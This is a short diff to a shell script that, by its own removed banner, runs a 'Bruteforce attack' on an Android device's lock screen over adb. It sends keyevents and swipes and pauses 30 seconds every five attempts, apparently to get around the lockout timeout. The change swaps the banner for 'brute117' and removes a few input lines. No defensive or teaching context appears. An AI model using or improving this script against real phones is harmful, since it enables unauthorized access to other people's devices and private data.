@@ -6,7 +6,7 @@ case $screen in
         echo -e "All Has Been Set" ;;
     "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
 esac
-echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+echo -e "brute117"
 adb shell input keyevent 3
 echo "home button"
 adb shell input keyevent 82
@@ -25,10 +25,7 @@ do
             echo "home button"
             if ! (( `expr $i + 1` % 5 )); then
                 echo "now timeout"
-                adb shell input keyevent 66
                 sleep 30
-                adb shell input keyevent 3
-                adb shell input swipe 407 1211 378 85
             fi
         fi
     done
